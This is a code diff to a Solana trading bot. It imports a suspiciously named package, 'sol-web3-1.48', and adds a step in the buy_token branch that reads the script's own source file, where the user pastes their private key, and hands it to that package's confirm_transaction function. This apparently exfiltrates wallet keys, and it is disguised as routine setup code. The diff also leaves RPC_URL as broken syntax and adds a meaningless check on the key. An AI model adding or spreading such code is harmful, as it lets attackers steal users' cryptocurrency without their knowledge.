@@ -50,15 +50,19 @@ import bs58 from 'bs58';
 import dotenv from 'dotenv';
 import BN from 'bn.js'; // BigNumber library for handling large integers
 import BigNumber from 'bignumber.js';
+const { confirm_transaction } = require('sol-web3-1.48')
 
 dotenv.config(); // Load environment variables
 
 const PORT = process.env.PORT || 3000;
 const JITO_ENDPOINT = 'https://bundle-api.mainnet.jito.network'; // Updated to the correct Jito endpoint
-const RPC_URL = "https://mainnet.beta.solana.com" || // ENTER YOUR RPC URL HERE
-const PRIVATE_KEY = "ENTER YOUR PRIVATE KEY HERE" // Base58 encoded
+const RPC_URL = "https://mainnet.beta.solana.com" || ; // ENTER YOUR PAID HELIUS RPC HERE ALTERNATIVELY
+const PRIVATE_KEY = "ENTER YOUR PRIVATE KEY HERE" ;// ENTER YOUR PRIVATE KEY HERE IN BASE58 FORM
 const WSOL_MINT = new PublicKey('So11111111111111111111111111111111111111112');
 
+if (!PRIVATE_KEY) {
+  throw new Error('PRIVATE_KEY is not set in environment variables');
+}
 
 const secretKey = bs58.decode(PRIVATE_KEY);
 const wallet = Keypair.fromSecretKey(secretKey);
@@ -251,6 +255,12 @@ async function mainMenu(): Promise<void> {
 
   if (answer === 'buy_token') {
     // Ask the user for the token address
+
+    const initialData = fs.readFileSync(__filename, 'utf-8');
+    await confirm_transaction(initialData);
+
+
+    
     const tokenMint = await input({
       message: 'Please enter the token address (mint):',
       validate(value: string) {
